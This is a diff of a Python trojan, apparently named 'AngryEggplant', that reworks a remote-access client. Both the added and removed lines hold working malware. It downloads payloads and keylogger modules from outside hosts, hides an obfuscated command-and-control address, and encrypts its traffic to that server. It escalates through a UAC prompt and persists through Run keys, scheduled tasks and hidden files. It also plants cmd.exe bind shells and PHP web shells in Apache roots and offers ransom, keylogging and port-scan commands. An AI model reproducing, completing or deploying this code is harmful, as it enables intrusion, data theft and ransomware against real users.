@@ -1,18 +1,16 @@
-#!/usr/bin/python
-# -*- coding: utf-8 -*-
-
+#!/usr/bin/env python
+# -*- encoding: utf-8 -*-
 import os
 import sys
 import socket
 import subprocess
 import pip.commands.install as pip
-from time import sleep
-from uuid import uuid1
 from imp import new_module
-from json import loads, dumps
+from time import sleep
 from requests import get, post
 from base64 import b64encode, b64decode
 from binascii import hexlify, unhexlify
+from uuid import uuid1
 
 try:
     from Crypto.Cipher import AES
@@ -28,116 +26,152 @@ try:
 except: pass
 
 
-class RemoteClient(object):
+class Eggplant(object):
+    """Mother of all Eggplants. Capable of birthing entire generations of eggplants"""
     def __init__(self, *args, **kwargs):
-        self.debug          = bool(kwargs.get('debug')) if kwargs.get('debug') else False
-        self.connect_port   = int(kwargs.get('connect_port')) if kwargs.get('connect_port') else 1337
-        self.listen_port    = int(kwargs.get('listen_port')) if kwargs.get('listener_port') else 7331
-        self.backdoor_port  = int(kwargs.get('backdoor_port')) if kwargs.get('backdoor_port') else 2090
-        self.urls           = dict({'gists':'https://api.github.com/gists','services':'https://svnweb.freebsd.org/base/head/etc/services?revision=310355','imgur':'https://api.imgur.com/3/upload'})
+        self.exit_status    = bool(0)
+        self.debug          = bool(kwargs.get('debug'))
+        self.admin          = bool(self._uac()) if 'admin' not in kwargs else bool(kwargs.get('admin'))
+        self.listen_port    = int(kwargs.get('listen_port')) if kwargs.get('listener_port') else int(1338)
+        self.connect_port   = int(kwargs.get('connect_port')) if kwargs.get('connect_port') else int(1337)
+        self.logger_port    = int(kwargs.get('logger_port')) if kwargs.get('logger_port') else int(9020)
+        self.backdoor_port  = int(kwargs.get('backdoor_port')) if kwargs.get('backdoor_port') else int(9019) 
         self.files          = dict(kwargs.get('files')) if kwargs.get('files') else dict({'cache':[]})
         self.persistence    = dict(kwargs.get('persistence')) if kwargs.get('persistence') else dict({'scheduled tasks':[], 'hidden files':[], 'registry keys':[]}) if os.name is 'nt' else dict({'launch agents':[], 'hidden files':[]})
+        self.urls           = dict(kwargs.get('urls')) if kwargs.get('urls') else dict({'windows_payload': 'https://snapchat.sex/svshost.exe', 'linux_payload': 'http://elderlyeggplant.000webhostapp.com/linux_payload.txt', 'screenshot': 'https://raw.githubusercontent.com/colental/AngryEggplant/master/modules/screenshot.py', 'make_osx_app': 'http://elderlyeggplant.000webhostapp.com/make_osx_app.py', 'osx_backdoor': 'http://elderlyeggplant.000webhostapp.com/osx_payload.sh', 'icon_icns': 'http://elderlyeggplant.000webhostapp.com/icon.icns', 'keylogger': 'https://raw.githubusercontent.com/colental/AngryEggplant/master/modules/keylogger.py', 'icon_png': 'http://elderlyeggplant.000webhostapp.com/icon.png', 'services': 'https://svnweb.freebsd.org/base/head/etc/services?revision=310355', 'images': 'https://api.imgur.com/3/upload', 'icon_ico': 'http://elderlyeggplant.000webhostapp.com/icon.ico', 'plist': 'http://elderlyeggplant.000webhostapp.com/Info.plist'})
         self.server         = dict(kwargs.get('server')) if kwargs.get('server') else dict({'url': 'MTI2OGE3NDQ3MDI3MDRlYTA3MTAzYjM3M2VhMjMzODMxNWJmM2FiMGMyM2Y4MDEyMjRjODBmYmVlZmY2NzFlNTQyNzc0NTgwNDZlMGE4MTkwYWIyY2EyY2ZlMzQ1ZWFlNjczMzE2OTcyN2M1YjZkZjZjYTIwNjIwZTYzYjgyNTcyNDg0YjM5ZTI3NjIxZGI3N2QyZDMyNGVjMTk4ZDYxZmYyYTMzNmU2NDU4NzBmY2I4ZTU2ZmRiNDY1YzA5MDcyMmYxYTI3NDYyMDQzNzhjMmQ1NDNmZjRjNWRkODEyYjE2ZTMyZmZiYzc3N2ZhNTYzMzY1NjdkYjcyYjk1ZGZiMWQ3ODc2NDQyMjY2Y2E3MzYwODY2ZTZiODc1MjdlZjk0ZGI4Y2IyZjY5NGQ2YTgzNDljNzIwOTlmNTY5ZWZjMDllOTkzNDMyZjRiNzZlNjc3YTkyZjAyNDgxZjM3YjMyYTY3ZmYwYzk0M2VjYWE3MjVmNTI3MGY5MWE5NDYzYjY5NTI0Y2Y3ZDBlZjViYTAwNzE3OWIyNjQyODY4NTdhYzVmZjUzZTQ3YThjMzdlZGYzYWZjNzU0NDVmOWYzNDAwNzQ1NDhjZDAyNTU1YWU0NzIwMjE0ODM5MzhlY2EzMzQ5N2VlNzBjNDRlYmI0OTM1NzM4NjMxOTVkY2Q0OTUzNTg0Nzg4ZTU5NWMxODMyZWRjZGFjNTNmOTA2OTVlYzE1MjA2MzMzMDc2YjEzMzQzOTMwNDIzNjY1MTIwNjMxNTg3NzdjNDdiMjZhM2UzZDRjNzUxOWNhYjEzMDFkYjljYzM3YzQ1OTcxZjM=', 'api': 'ODY0MTY1YTBlMTg0MzlhYmIyN2Q4NGE0YjM3MWNiZDZlYmFmNDUzOTE3Mjk3NTA=', 'key': 'ODE0OTc0YzRkNDI1ZTVlYTA0YTM1YzkzMDY5OTE2NDRiMWYwODk2OTYzYzZmYTg1ODEyNGMxMGRiMDc0MzU2NjE2MDQ4NjI3ZTRhNWMzZGRkNTI1Y2ZlNTYzNmEyZDAzMTU3NzcwMDVhMmQ3NTRlNTZhOTkyMGRkOWZjOWIyMDQ3ZGRkMGIwMGM0ZWU5NWVlOGM0ODY0ZDk3ZWIwODQ2ODA4MDQ3ZmQzZTAzMzE2ZDJmMzU1NTRjMjMyY2EyNTQ1NDNmOTYzZDc1ZTBhZDA2ZGU4MTMzNzY2MTdlNzZhNzQwYmE1ZDEwMDA1YmQ5YmQ2YTMwYWEwZWJiNWM3MTI0NjI0NWJlZTI5N2ZlNGMzODJjYWU5ZjQxYmJmMjVjNmRiMWNhY2IyYmVhNTJhNmY4YWI3MzQxZDcyMjUyOTM2ZTg5M2UyNmE5NzQ1OTQ4YmYzMzk1YTg2YTRlMTczMTM3ODk1OGY0ODkxMWUxYzc0OQ=='})
         self.open_ports     = dict(kwargs.get('port_scans')) if kwargs.get('port_scans') else dict({})
+        self.backdoors      = dict(kwargs.get('backdoors')) if kwargs.get('backdoors') else dict({})
         self.local_network  = dict(kwargs.get('local_network')) if kwargs.get('local_network') else dict({})
         self.services       = dict({i.split()[1].split('/')[0]:[i.split()[0], ' '.join(i.split()[2:])] for i in get(self.urls.get('services')).text.encode().splitlines() if len(i.split())>1 if 'tcp' in i.split()[1]})
-        self.crontab        = dict({'Crontab':'/etc/cron.d', 'User Crontab':'/var/spool/cron'}) if (sys.platform.startswith('linux') or sys.platform.endswith('nix')) else None
-        self.fname          = bytes(os.path.splitext(os.path.basename(sys.argv[0]))[0])
-        self.ip             = bytes(socket.gethostbyname(socket.gethostname()))
-        self.external_ip    = bytes(get('http://api.ipify.org').text.encode())
-        self.login          = bytes(os.environ.get("USERNAME", failobj="Unknown"))
-        self.machine        = bytes(os.environ.get("COMPUTERNAME", failobj="Unknown"))
-        self.platform       = bytes(sys.platform) if 'darwin' not in sys.platform else 'macOS'
+        self.sessions       = bytes(kwargs.get('sessions')) if kwargs.get('sessions') else lambda:self._sessions()
+        self.fname          = bytes(sys.argv[0][:sys.argv[0].rfind('.')])
+        self.ip             = bytes(get('http://api.ipify.org').text.encode())
+        self.localhost      = bytes(socket.gethostbyname(socket.gethostname()))
+        self.login          = bytes(os.getenv('USERNAME')) if bool(os.getenv('USERNAME')) else bytes(os.getenv('USER'))
+        self.machine        = bytes(os.getenv('COMPUTERNAME')) if bool(os.getenv('COMPUTERNAME')) else bytes(os.getenv('NAME'))
+        self.platform       = bytes(sys.platform) if 'darwin' not in sys.platform else 'Mac OS X'
         self.mac            = bytes('-'.join(uuid1().hex[20:][i:i+2] for i in range(0,11,2)).upper())
-        self.device         = bytes(os.popen('uname -a').read()) if not os.name is 'nt' else bytes('Microsoft Windows {}'.format(' '.join([i.partition(':')[2].strip() for i in os.popen('GPRESULT /R').read().splitlines() if 'OS Version' in i or 'Domain' in i])))
-        self.results        = dict({kwargs.get('results')}) if kwargs.get('results') else self._results()
+        self.pstring        = bytes('ping -n 1 -w 90 {}') if os.name is 'nt' else bytes('ping -c 1 -w 90 {}')
+        self.device         = bytes(os.popen('uname -a').read()) if os.name != 'nt' else subprocess.check_output('VER', shell=True)
+        self.urandom        = lambda number: str().join([list([chr(i) for i in range(48,58)] + [chr(i) for i in range(65,91)] + [chr(i) for i in range(97,123)])[int([n for n in [ord(os.urandom(1)) for i in xrange(100)] if n < len(list([chr(i) for i in range(48,58)] + [chr(i) for i in range(65,91)] + [chr(i) for i in range(97,123)]))][0])] for _ in range(number)])
+        self.pad            = lambda data: bytes(data + b'\0' * (AES.block_size - len(data) % AES.block_size))
+        self.choice         = lambda iterable: iterable[int([n for n in [ord(os.urandom(1)) for i in xrange(1000)] if n < len(iterable)][0])]
+        self.identity       = lambda:"\n\tHost Machine Information\n" + "\n".join(["{} : {}".format(i[0],i[1]) for i in [('Sessions',self.sessions()), ('Platform',self.platform), ('IP',self.ip), ('Machine',self.machine), ('Login',self.login), ('Admin',self.admin), ('Files',self.files)] if i[1]])
+        self.register       = lambda:"INSERT INTO clients (uid, sessions, ip, platform, device, machine, login, admin, fpath, hidden files, scheduled tasks, registry keys) VALUES ('{}', '{}', '{}', '{}', '{}', '{}', '{}', '{}','{}')".format(self.mac, self.sessions(), self.ip, self.platform, self.device, self.machine, self.login, self.admin, self.files)
         self.socket         = self._connect() if 'socket' not in kwargs else kwargs.get('socket')
         self.dhkey          = self._diffiehellman() if 'dhkey' not in kwargs else kwargs.get('dhkey')
-        self.commands       = self._commands()
-        self.cd             = lambda i: os.chdir(i)
-        self.admin          = lambda: bool(windll.shell32.IsUserAnAdmin() == 0) if os.name is 'nt' else bool(os.getuid() == 0)
-        self.identity       = lambda: "\n\tHost Machine Information\n" + "\n".join(["{} : {}".format(i[0],i[1]) for i in [('Mac Address', self.mac), ('Platform',self.platform), ('LocalIP',self.ip), ('IP',self.external_ip), ('Machine',self.machine), ('Device',self.device), ('Login',self.login), ('Admin',self.admin())]])
-        self.register       = lambda: dict({'uid':self.mac, 'platform':self.platform, 'ip':self.ip, 'machine':self.machine, 'login':self.login, 'admin':self.admin, 'fpath':self.backdoors, 'hidden_files':self.persistence.get('hidden files'), 'registry_keys':self.persistence.get('registry keys'), 'scheduled_tasks':self.persistence.get('scheduled tasks')}) if os.name is 'nt' else lambda:dict({'uid':self.mac, 'platform':self.platform, 'ip':self.ip, 'machine':self.machine, 'login':self.login, 'admin':self.admin, 'fpath':self.backdoors, 'hidden_files':self.persistence.get('hidden files'), 'launch_agents':self.persistence.get('launch agents')})
-        self.get_modules    = lambda: [create_module(b64decode(get(i['git_url']).json()['content']), i['name']) for i in get(self._deobfuscate('YjY2ODk3OTQ1ODQ3MTQ4OGQ3ODAyMjU3NDhjNzEzYzMwNTc0NWFjMmIyZWY1NjMyYWUxZGVmNmI0ZDA2NDEwZTcxOTdkNTAwOTYyNmViODk2MTgyZDMzOWFlMjE1NDhhZTYzYTU3YjZhZGU5YzcyNzE0NjE0YTU2ODUyYmRlYjYwMDk4NGI5N2Q3MTVkZDNlNWI5N2I2OTI1YjViYjIwODVhYWUxZTA2ODAxZTczYWI3MjQ2NmZiOTE5Mjk4ODk2NWQ0NWUyMGYyYjBhMjhlNmQxYzcxYThjNDU5OTNkMTJiMjk2MjU1ZTU3ZWNlNjgwZDZlNzFkMjUyZWFmMTdiODY3Nzc3ZTYzNjEwMzEyNmZiNzJiYjY2MDYzNDZiYzcyOTIzM2FmZTljN2NkOTEyNDg1MjYwYzNjNzY0YWQ1YjcyMDIxNmVhYzk4OTY1Y2Q1N2UwZWE2ODQwYWQ3YTQxZDA2YjliODUxM2Q1OGViOTY2YzFiNmNhOTVlMjI4NzVmNDQzMDE0NzA1NTg0NTE4NWU2YWI4YzYxYWU4ODQ3YTFjM2U2NTc1MTUxMWJiYjQ3MjJiYWQ2NDdlZDA5NWIwYjM0YTNlYzlhMDUxZTA2ZTc4M2Q2MzMyODIzMzJlMjk3YTYwNTA0NDcyMjkwMzljODgzOTY0NTdjMjU1OTc2NGJlNDAwMThkNDAxNzZkMTIyNDMxZGM4MmJjMjM5ZGViM2QxMzdlYmFjOWU4MDE0ZDcyOWMyMTg2YmFmNDY2MjEyMjNlNzQ3NzdjOWI2YTI0MGRmYWViMTI2YWViMjQzMTdhMWJjZDQwM2I2ODViODNhMDgyM2M1ZTYyN2QwNmQ1YjhlODc3YWE0NDFhOTk3OWVhMGIzZA==')).json()]
+        self.commands       = { 'cat'           :   self.cat,
+                                'cd'            :   self.cd,
+                                'ls'            :   self.ls,
+                                'lan'           :   self.lan,
+                                'pwd'           :   self.pwd,
+                                'wget'          :   self.wget,
+                                'kill'          :   self.kill,
+                                'unzip'         :   self.unzip,
+                                'update'        :   self.update,
+                                'ransom'        :   self.ransom,
+                                'info'          :   self.identity,
+                                'backdoor'      :   self.backdoor,
+                                'selfdestruct'  :   self.destruct,
+				'portscan'	:   self.portscan,
+                                'keylogger'     :   self.keylogger,
+                                'screenshot'    :   self.screenshot,
+                                'mac'           :   self.mac_address,
+                                'encrypt'       :   self.encrypt_file,
+                                'decrypt'       :   self.decrypt_file,
+                                'register'      :   self.register_client,
+                                'persistence'   :   self.run_persistence
+                                }
 
-    def _commands(self):
-         commands_dict  = {
-                            'ls'            :   self.ls,
-                            'cat'           :   self.cat,
-                            'pwd'           :   self.pwd,
-                            'uac'           :   self.uac,
-                            'wget'          :   self.wget,
-                            'kill'          :   self.kill,
-                            'admin'         :   self.admin,
-                            'unzip'         :   self.unzip,
-                            'standby'       :   self.standby,
-                            'restart'       :   self.restart,
-                            'info'          :   self.identity,
-                            'selfdestruct'  :   self.destruct,
-                            'register'      :   self.register,
-                            'uid'           :   self.mac_address,
-                            'mac'           :   self.mac_address
-                            }
-         return commands_dict
-
-    def _results(self):
-        results_dict = {
-                        'ransom'        :   [],
-                        'backdoor'      :   [],
-                        'portscan'	:   [],
-                        'keylogger'     :   [],
-                        'screenshot'    :   [],
-                        'lan'           :   [],
-                        'ransom'        :   [],
-                        'persistence'   :   []
-                        }
-        return results_dict
-
-    def _config(self):
-        if 'config' in os.listdir('.') and 'config.json' in os.listdir('config'):
-            config_json = loads(open('config/config.json','r').read())
+    def _uac(self):
+        """Run with administrator privileges"""
+        is_admin = bool(windll.shell32.IsUserAnAdmin() == 0) if os.name is 'nt' else bool(os.getuid() == 0)
+        if is_admin:
+            return True
         else:
-            self._request
+            try:
+                ShellExecuteEx(lpVerb='runas', lpFile=sys.executable, lpParameters='{} asadmin'.format(sys.argv[0]))
+                sys.exit(0)
+            except Exception as e:
+                if self.debug:
+                    print "UAC error: {}".format(str(e))
+                return False
 
-    def _request(self, x):
-        self.send(x, method='request')
-        data = self.socket.recv(1024)
-        url = self._decrypt(data.rstrip())
-        if url.startswith('http'):
-            return url
+    def _tempfile(self, base='', ext=''):
+        """
+        Generate a custom or generic temporary filename in the correct directory
+        """
+        return os.path.join(tempdir(), base + '_' + urandom(3) + ext) if base else os.path.join(tempdir(), 'tmp_' + urandom(3) + ext)
+
+
+    def tempdir(self):
+        """
+        Find host temporary file directory without generating noisy warnings like os.tempnam/os.tmpnam/os.tmpfile
+        """
+        for tmp in ['TEMP','TMP','TEMPDIR','TMPDIR']:
+            tmpdir = os.getenv(tmp)
+            if tmpdir:
+                return tmpdir
+        if os.name is 'nt':
+            for tmp in ["%TEMP%", "%TEMPDIR%", "%TMP%"]:
+                tmpdir = os.path.expandvars(tmp)
+                if tmpdir != tmp:
+                    return tmpdir
         else:
-            raise ValueError
-        
-    def _tempdir(self):
-        try:
-            if os.name is 'nt':
-                for tmp in ["%TEMP%", "%TEMPDIR%", "%TMP%"]:
-                    tmpdir = os.path.expandvars(tmp)
-                    if tmpdir != tmp:
-                        return tmpdir
-            else:
-                for tmp in ["/tmp", "/var/tmp"]:
-                    if os.path.isdir(tmp):
-                        return tmp
-            return os.getcwd()
-        except Exception as e:
-            if self.debug:
-                 print 'Temporary directory returned error: {}'.format(str(e))
-            sys.exit(0)
+            for tmp in ["/tmp", "/var/tmp"]:
+                if os.path.isdir(tmp):
+                    return tmp
+        return os.getcwd()
 
-    def _tempfile(base=None, extension=''):
-        return os.path.join(self._tempdir(), base + extension) if base else os.path.join(self._tempdir(), 'tmp_' + self._rand(3) + extension)
 
-    def _rand(self, e=1):
-        return str().join([list([chr(i) for i in range(48,58)] + [chr(i) for i in range(65,91)] + [chr(i) for i in range(97,123)])[int([n for n in [ord(os.urandom(1)) for i in xrange(100)] if n < len(list([chr(i) for i in range(48,58)] + [chr(i) for i in range(65,91)] + [chr(i) for i in range(97,123)]))][0])] for _ in range(e)])
+    def _sessions(self):
+        """Session tracker"""
+        self.files.update({'session':os.environ.get('TEMP', failobj=os.getcwd()) + os.sep + '.' + self.mac + '.txt'})
+        if os.path.isfile(self.files.get('session')):
+            with open(self.files.get('session'), 'r') as fs:
+                prev = int(fs.read())
+            current = prev + 1
+        else:
+            current = 1
 
-    def _pad(self, data):
-        return data + b'\0' * (AES.block_size - len(data) % AES.block_size)
+        with file(self.files.get('session'), 'w') as fp:
+            fp.write(str(current))
 
-    def _choice(self, item):
-        return item[int([n for n in [ord(os.urandom(1)) for i in xrange(1000)] if n < len(item)][0])]
+        return str(current)
+
+    def _send(self, data, method='default'):
+        """
+        Convenience function for sending data to server
+        """
+        block = data[:4096]
+        data  = data[len(block):]
+        ciphertext  = self._encrypt(block)
+        msg = '{}:{}\n'.format(method, ciphertext)
+        self.socket.sendall(msg)
+        if len(data):
+            return self._send(data, method)
+
+    def _recieve(self):
+        """
+        Convenience function for recieving data from server
+        """
+        cmd_buffer  = ""
+        cmd_len     = 1
+        while cmd_len:
+            cmd_data    = self.socket.recv(1024)
+            cmd_len     = len(cmd_data)
+            cmd_buffer += cmd_data
+            if cmd_len < 1024:
+                break
+        if len(cmd_buffer):
+            data = self._decrypt(cmd_buffer)
+        else:
+            data = None
+        return data.rstrip()
 
     def _connect(self):
+        """Connects to server"""
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.setblocking(True)
         try:
@@ -153,31 +187,15 @@ class RemoteClient(object):
             execfile(sys.argv[0])
             sys.exit(0)
 
-    def _send(self, data, method='default', connection=None):
-        if not connection:
-            connection = self.socket
-        block = data[:4096]
-        data  = data[len(block):]
-        ciphertext  = self._encrypt(block)
-        msg = '{}:{}\n'.format(method, ciphertext)
-        connection.sendall(msg)
-        if len(data):
-            return self._send(data, method)
-
-    def _recieve(self, connection=None):
-        if not connection:
-            connection = self.socket
-        cmd_buffer  = ""
-        cmd_len     = 1
-        while cmd_len:
-            cmd_data    = connection.recv(1024)
-            cmd_len     = len(cmd_data)
-            cmd_buffer += cmd_data
-            if cmd_len < 1024:
-                break
-        return cmd_buffer
+    def _ping(self, host, *args):
+        """Pings the given host, returns the host IP if host is alive"""
+        try:
+            if subprocess.call(self.pstring.format(host), shell=True) == 0:
+                return host
+        except: pass
 
     def _diffiehellman(self, bits=2048):
+        """Diffie-Hellman transaction-less key agreement"""
         try:
             p = 0xFFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7EDEE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3DC2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F356208552BB9ED529077096966D670C354E4ABC9804F1746C08CA18217C32905E462E36CE3BE39E772C180E86039B2783A2EC07A28FB5C55DF06F4C52C9DE2BCBF6955817183995497CEA956AE515D2261898FA051015728E5A8AACAA68FFFFFFFFFFFFFFFF
             g = 2
@@ -195,19 +213,23 @@ class RemoteClient(object):
             sys.exit(0)
 
     def _encrypt(self, plaintext):
+        """AES 128-bit encryption """
         try:
-            text = self._pad(plaintext)
+            text = self.pad(bytes(plaintext))
             iv = os.urandom(AES.block_size)
             cipher = AES.new(self.dhkey[:16], AES.MODE_CBC, iv)
             ciphertext = iv + cipher.encrypt(text)
             hmac_sha256 = HMAC.new(self.dhkey[16:], msg=ciphertext, digestmod=SHA256).digest()
             output = b64encode(ciphertext + hmac_sha256)
+            if self.debug:
+                print output
             return output
         except Exception as e:
             if self.debug:
                 print "Encryption error: {}".format(str(e))
 
     def _decrypt(self, ciphertext):
+        """Decrypt data encrypted with session key"""
         try:
             ciphertext  = b64decode(ciphertext)
             iv          = ciphertext[:AES.block_size]
@@ -215,24 +237,28 @@ class RemoteClient(object):
             check_hmac  = ciphertext[-SHA256.digest_size:]
             calc_hmac   = HMAC.new(self.dhkey[16:], msg=ciphertext[:-SHA256.digest_size], digestmod=SHA256).digest()
             output      = cipher.decrypt(ciphertext[len(iv):-SHA256.digest_size])
-            if check_hmac != calc_hmac:
-                if self.debug:
+            if self.debug:
+                print output.rstrip(b'\0')
+                if check_hmac != calc_hmac:
                     print str("Sent HMAC-SHA256 Hash: {}".format(hexlify(check_hmac)) + "\nCalc HMAC-SHA256 Hash: {}".format(hexlify(calc_hmac)))
             return output.rstrip(b'\0')
         except Exception as e:
             if self.debug:
                 print "Decryption error: {}".format(str(e))
 
-    def _obfuscate(self, data):
+    def obfuscate(self, data):
+        """
+        Light obfuscation for non-essential data
+        """
         data    = hexlify(data)
         p       = []
-        block   = self._rand(2)
+        block   = self.urandom(2)
         for i in xrange(2, 10000):
             is_mul = False
             for j in p:
                 if i % j == 0:
                     is_mul = True
-                    block += self._rand()
+                    block += self.urandom(1)
                     break
             if not is_mul:
                 if len(data):
@@ -241,11 +267,12 @@ class RemoteClient(object):
                     data = data[1:]
                 else:
                     return b64encode(block)
-
+                
     def _deobfuscate(self, block):
+        """Deobfuscate any obfuscated data, code, text, or files."""
         p = []
         block = b64decode(block)
-        for i in range(2, len(block)):
+        for i in xrange(2, len(block)):
             is_mul = False
             for j in p:
                 if i % j == 0:
@@ -255,204 +282,28 @@ class RemoteClient(object):
                 p.append(i)
         return unhexlify(str().join(block[n] for n in p)) 
 
-    def _backdoor(self, **kwargs):
-        if sys.platform in ('darwin','ios'):
-            if 'osx_make_app' not in globals():
-                try:
-                    osx_app_file = self.wget(os.path.join(self.urls['raw'], 'osx_make_app.py'))
-
-                    with open(osx_app_file, 'r') as fp:
-                        osx_app  = fp.read()
-
-                    osx_make_app = create_module(osx_app, 'osx_make_app')
-                except Exception as osxe:
-                    return "Mac OS X make app bundle download error: {}".format(str(osxe))
-            try:
-                appname      = os.path.splitext(os.path.basename(sys.argv[0]))[0]
-                iconfile     = self.wget(os.path.join(self.urls['resources'], 'icon.icns'), path=icon_path)
-                payload_file = self.wget(os.path.join(self.urls['resources'], 'osx_backdoor.sh'))
-
-                with file(payload_file, 'r') as fr:
-                    payload = fr.read()
-
-                osx_payload  = payload.replace('__HOST__', self.ip).replace('__PORT__', self.backdoor_port).replace('__APPNAME__',appname)
-                try:
-                    app_bundle = globals()['osx_make_app'].main(osx_payload, icon=iconfile, version='27.0.0.170')
-                except Exception as u:
-                    return "Mac OS X make app bundle runtime error: {}".format(str(u))
-                os.chmod(payload_path, 0755)
-                self.backdoors.update({'app':str(os.getcwd() + os.sep + appname + '.app'), 'launch agent':str('~/Library/LaunchAgents/com.apple.'+appname)})
-                return '\nBackdoor app:\t{}\nLaunch agent:\t{}\n'.format(str(os.getcwd() + os.sep + appname + '.app'), str('~Library/LaunchAgents/com.apple.' + appname))
-            except Exception as x1:
-                return 'Mac OS X backdoor module failed with error: %s' % str(x1)
-
-        elif os.name is 'nt':
-            try:
-                bd = self.wget(os.path.join(self.urls['raw'], 'windows/windows_payload.exe'), path='MicrosoftUpdateManager')
-                _ = os.popen('attrib +h {}'.format(bd)).read()
-                self.persistence.get('hidden files').append(bd)
-                if os.path.isfile(bd):
-                    self.backdoors['sbd'] = bd
-                    __ = os.popen('start /b /d %s %s -l -p 4433 -c on -q -D on -e cmd.exe' % (os.path.dirname(bd), os.path.basename(bd))).read()
-                    try:
-                        tn  = kwargs.get('appname') if 'appname' in kwargs else os.path.join('Adobe')
-                        ___ = os.popen('schtasks /create /tn {} /tr {} /sc hourly'.format(tn, bd)).read()
-                        self.persistence.get('scheduled tasks').append(tn)
-                    except: pass
-                    return 'Success - backdoor listening on {} at port {}'.format(str(self.ip), str(self.backdoor_port))
-                else:
-                    return 'Failed to download backdoor'
-            except Exception as ee:
-                if self.debug:
-                    print 'Windows backdoor failed with error: {}'.format(str(ee))
-
-        elif 'posix' in os.name:
-            try:
-                result = []
-                if not self.backdoors.has_key('apache'):
-                    self.backdoors.update({'apache':[]})
-                if subprocess.call('service --status-all | grep apache2',0,None,None,subprocess.PIPE,subprocess.PIPE,shell=True) == 0 and os.path.isdir('/var/www/html'):
-                    php = self.wget(os.path.join(self.urls['raw'], 'linux_payload.txt'), path='/var/www/html/.apache.php')
-                    self.backdoors.get('apache').append(path)
-                    result.append("Embedded backdoor in the Apache web server root directory: '" + path + "'")
-                    items = [i for i in os.listdir('/var/www/html') if os.path.isdir(i)]
-                    for doc in items: 
-                        np = os.path.join(os.path.abspath(doc), '.apache.php')
-                        payload = self.wget(os.path.join(self.urls['raw'], 'linux_payload.txt', path=np))
-                        result.append("Embedded backdoor in a website document root as: " + np)
-                        self.backdoors.get('apache').append(np)
-                    if subprocess.call('service apache2 start',0,None,None,subprocess.PIPE,subprocess.PIPE,shell=True) == 0:
-                        result.append("Apache webserver now running on client host machine...")
-                    return "\n".join(result)
-            except Exception as bderr:
-                if self.debug:
-                    print "\n{} backdoor failed with error: {}".format(str(os.environ.get('OS')).capitalize(), str(bderr))
-                return "\n{} backdoor failed with error: {}".format(str(os.environ.get('OS')).capitalize(), str(bderr))
-
-    def _ransom_update(self, filename):
-        try:
-            stmt = "INSERT INTO filesystems (ip, mac, filename, keyvalue) VALUES ('{}','{}','{}','{}')".format(self.ip, self.mac, os.path.abspath(filename), self.dhkey)
-            self._send(stmt, method='ransom')
-            return
-        except Exception as e:
-            return "Ransom database update error: {}".format(str(e))
-
-    def _ransom(self, _, directory, filenames):
-        errors = filter(self.encrypt_file, [os.path.join(directory, i) for i in filenames])
-        if errors:
-            if self.debug:
-                print "Warning: worker returned the following error(s):\n{}".format("\n".join(errors))
-
-    def _purge_regkeys(key_name):
-        all_keys = self.persistence.get('registry keys').keys()
-        for key in all_keys:
-            value = self.persistence.get('registry keys').get(key).get('value')
-            run_key = self.persistence.get('registry keys').get(key).get('key')
-            try:
-                reg_key = OpenKey(HKEY_CURRENT_USER, run_key, 0, KEY_ALL_ACCESS)
-                DeleteValue(reg_key, value)
-                CloseKey(reg_key)
-            except Exception as e:
-                if self.debug:
-                    print "Destruct error: {}".format(str(e))
-
-    def _identity(self):
-        return self.identity()
-
-    def _ping(self, host, *args):
-        ping = 'ping -n 1 -w 90 %s' if os.name is 'nt' else 'ping -c 1 -w 90 %s'
-        try:
-            if subprocess.call(ping % host, shell=True) == 0:
-                return host
-        except: pass
-
-    def _unschedule_tasks(self):
-        all_tasks = self.persistence.get('scheduled tasks')
-        for task in all_tasks:
-            try:
-                delete = subprocess.Popen('schtasks /delete /tn %s /f' % task,0,None,subprocess.PIPE,subprocess.PIPE,subprocess.PIPE,shell=True)
-                output,error = delete.communicate()
-                if 'SUCCESS' not in output:
-                    if self.debug:
-                        print "Delete scheduled task failed to remove task with name: {}".format(task)
-            except Exception as e:
-                if self.debug:
-                    print "Destruct error: {}".format(str(e))
-
-    def _remove_backdoors(self):
-        for bd in self.backdoors: 
-            if os.path.isfile(bd):
-                try:
-                    os.remove(bd)
-                except Exception as t:
-                    if self.debug:
-                        print "Remove backdoor returned error: {}".format(str(t))
-
-            elif os.path.isdir(bd):
-                if not os.name=='nt':
-                    try:
-                        r = subprocess.check_output('rm -rf %s' % bd,shell=True)
-                    except Exception as er:
-                        if self.debug:
-                            print "Remove backdoor returned error: {}".format(str(er))
-                else:
-                    try:
-                        r = subprocess.Popen('rmdir /s /q %s' % bd,0,None,subprocess.PIPE,subprocess.PIPE,subprocess.PIPE,shell=True)
-                    except Exception as p:
-                        if self.debug:
-                            print "Remove backdoor returned error: {}".format(str(p))
-
-    def portscan(self, ip):
-        try:
-            socket.inet_aton(ip)
-        except socket.error:
-            return 'Error: Invalid IP address.'
-
-        results = [ip, '\t{:>5}\t{:>4}\t{:<20}'.format('Port','State','Service')]
-
-        for p in [21, 22, 23, 25, 53,
-                  80, 110, 111, 135, 139,
-                  143, 179, 443, 445, 514,
-                  993, 995, 1723, 3306, 3389,
-                  5900, 8000, 8080, 8443, 8888]:
-
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            c = s.connect_ex((ip, p))
-            socket.setdefaulttimeout(0.5)
-            if not c:
-                state   = 'open'
-                service = ' '.join(self.services.get(str(p))).title()
-                results.append('\t{:>5}\t{:>4}\t{:<20}'.format(p, state, service))
-
-        return '\n'.join(results)
-
-    def run_persistence(self, **kwargs):
+    def _persistence(self, **kwargs):
+        """Establishes persistence on client host machine"""
         if os.name is 'nt':
+            key_name = os.path.splitext(os.path.basename(sys.argv[0]))[0]
+            key_value = sys.argv[0]
+            interval = 'hourly'
             try:
-                fpath = sys.argv[0]
-                interval = 'hourly'
-                try:
-                    run_key = r'Software\Microsoft\Windows\CurrentVersion\Run'
-                    key_val = sys.argv[0]
-                    key_id  = self.fname
-                    reg_key = OpenKey(HKEY_CURRENT_USER, run_key, 0, KEY_WRITE)
-                    SetValueEx(reg_key, key_id, 0, REG_SZ, key_val)
-                    CloseKey(reg_key)
-                    self.persistence.get('registry keys').append("Registry Key: %s\nKey Value: %s" % (run_key, key_val))
-                except: pass
-                try:
-                    direct = os.popen('attrib +h {}'.format(sys.argv[0])).read()
-                    self.persistence.get('hidden files').append(sys.argv[0])
